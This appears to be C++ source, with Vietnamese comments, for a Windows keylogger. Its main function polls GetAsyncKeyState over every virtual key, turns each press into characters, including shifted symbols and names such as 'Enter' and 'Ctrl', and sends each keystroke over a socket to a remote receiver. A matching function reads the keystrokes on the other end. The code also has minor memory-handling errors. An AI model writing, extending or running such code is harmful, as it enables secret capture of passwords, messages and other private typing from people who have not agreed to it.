#include "KeyEvent.h"

bool IsCapitalized(short int shift, short int caps)
{
    bool s = shift < 0;
    bool c = (caps & 1) != 0;
    return s != c;
}

bool isHotKey(short t)
{
    if (t == VK_F1 || t == VK_F2 || t == VK_F3 || t == VK_F4 || t == VK_F5 || t == VK_F6 || t == VK_F7 || t == VK_F8 || t == VK_F9 || t == VK_F10 || t == VK_F11 || t == VK_F12)
        return true;
    if (t == VK_LBUTTON || t == VK_RBUTTON || t == VK_MBUTTON)
        return true;
    if (t == VK_BACK || t == VK_TAB || t == VK_RETURN)
        return true;
    if (t == VK_SNAPSHOT || t == VK_INSERT || t == VK_DELETE)
        return true;
    if (t == VK_CAPITAL || t == VK_MENU || t == VK_CONTROL || t == VK_SHIFT || t == VK_SLEEP || t == VK_NUMLOCK || t == VK_SPACE)
        return true;
    if (t == VK_LEFT || t == VK_UP || t == VK_RIGHT || t == VK_DOWN)
        return true;
    if (t == VK_HOME || t == VK_PRIOR || t == VK_NEXT || t == VK_END)
        return true;

    return false;
}

void findHotKey(short t, char *c)
{
    if (t == VK_F1)
        strcpy(c, "F1");
    if (t == VK_F2)
        strcpy(c, "F2");
    if (t == VK_F3)
        strcpy(c, "F3");
    if (t == VK_F4)
        strcpy(c, "F4");
    if (t == VK_F5)
        strcpy(c, "F5");
    if (t == VK_F6)
        strcpy(c, "F6");
    if (t == VK_F7)
        strcpy(c, "F7");
    if (t == VK_F8)
        strcpy(c, "F8");
    if (t == VK_F9)
        strcpy(c, "F9");
    if (t == VK_F10)
        strcpy(c, "F10");
    if (t == VK_F11)
        strcpy(c, "F11");
    if (t == VK_F12)
        strcpy(c, "F12");

    if (t == VK_LBUTTON)
        strcpy(c, "Left Mouse");
    if (t == VK_RBUTTON)
        strcpy(c, "Right Mouse");
    if (t == VK_MBUTTON)
        strcpy(c, "Middle Mouse");

    if (t == VK_BACK)
        strcpy(c, "Backspace");
    if (t == VK_TAB)
        strcpy(c, "Tab");
    if (t == VK_RETURN)
        strcpy(c, "Enter");
    if (t == VK_SNAPSHOT)
        strcpy(c, "Print screen");
    if (t == VK_INSERT)
        strcpy(c, "Insert");
    if (t == VK_DELETE)
        strcpy(c, "Delete");

    if (t == VK_CAPITAL)
        strcpy(c, "Cap lock");
    if (t == VK_MENU)
        strcpy(c, "Alt");
    if (t == VK_CONTROL)
        strcpy(c, "Ctrl");
    if (t == VK_SHIFT)
        strcpy(c, "Shift");
    if (t == VK_SLEEP)
        strcpy(c, "Sleep");
    if (t == VK_NUMLOCK)
        strcpy(c, "Num lock");
    if (t == VK_SPACE)
        strcpy(c, "Space");
    if (t == VK_LEFT)
        strcpy(c, "Left arrow");
    if (t == VK_UP)
        strcpy(c, "Up arrow");
    if (t == VK_RIGHT)
        strcpy(c, "Right arrow");
    if (t == VK_DOWN)
        strcpy(c, "Down arrow");
    if (t == VK_HOME)
        strcpy(c, "Home");
    if (t == VK_PRIOR)
        strcpy(c, "Page up");
    if (t == VK_NEXT)
        strcpy(c, "Page down");
    if (t == VK_END)
        strcpy(c, "End");

    c[strlen(c)] = '\0';
}

void shiftWith(short t, char *c)
{
    if (t == '1')
        strcpy(c, "!");
    if (t == '2')
        strcpy(c, "@");
    if (t == '3')
        strcpy(c, "#");
    if (t == '4')
        strcpy(c, "$");
    if (t == '5')
        strcpy(c, "%");
    if (t == '6')
        strcpy(c, "^");
    if (t == '7')
        strcpy(c, "&");
    if (t == '8')
        strcpy(c, "*");
    if (t == '9')
        strcpy(c, "(");
    if (t == '0')
        strcpy(c, ")");
    if (t == VK_OEM_1)
        strcpy(c, ":");
    if (t == VK_OEM_PLUS)
        strcpy(c, "+");
    if (t == VK_OEM_COMMA)
        strcpy(c, "<");
    if (t == VK_OEM_MINUS)
        strcpy(c, "_");
    if (t == VK_OEM_PERIOD)
        strcpy(c, ">");
    if (t == VK_OEM_2)
        strcpy(c, "?");
    if (t == VK_OEM_3)
        strcpy(c, "~");
    if (t == VK_OEM_4)
        strcpy(c, "{");
    if (t == VK_OEM_5)
        strcpy(c, "|");
    if (t == VK_OEM_6)
        strcpy(c, "}");
    if (t == VK_OEM_7)
        strcpy(c, "\"");
}

// Ham chinh
BOOL sendKeyEvent(Socket *s, int &flag)
{

        char *c = new char[10];
        if (flag == 0){
        for(int i = 0; i < 256; i++)
            GetAsyncKeyState(i);
        flag = 1;
        }
        for (int t = 0; t < 256; t++) // t = 0
        {
            if (GetAsyncKeyState(t) & 1)
            {
                if (t >= 160 && t <= 165)
                    continue;
                else if (t >= int('A') && t <= int('Z'))
                {
                    short int shift = GetAsyncKeyState(VK_SHIFT);
                    short int caps = GetKeyState(VK_CAPITAL);
                    if (!IsCapitalized(shift, caps))
                    {
                        c[0] = t + 32;
                        c[1] = '\0';
                    }
                    else
                    {
                        c[0] = char(MapVirtualKey(t, MAPVK_VK_TO_CHAR));
                        c[1] = '\0';
                    }
                }
                else if (isHotKey(t))
                    findHotKey(t, c);
                else if (GetAsyncKeyState(VK_SHIFT) < 0)
                    shiftWith(t, c);
                else
                {
                    c[0] = char(MapVirtualKey(t, MAPVK_VK_TO_CHAR));
                    c[1] = '\0';
                }
                try
                {
                    //   std::cout << c << endl;

                    s->SendBytes(c);
                }
                catch (...)
                {
                    std::cout << "Send failed?\n";
                    return 0; // gui that bai
                }
            }
        } // cout << count++ << endl;

        //}
        if (c != nullptr)
            delete c;

    return 1;
}

string ReceivedKeyEvent(SocketClient s)
{

    // printf("Press 'esc' if you want to escape:\n");
    string message;
    char thanh;
    stringstream total;

    message = s.ReceiveBytes();
    stringstream builder;
    total << message << " ";
    builder << message;
    return builder.str();
    //}
    //}
}
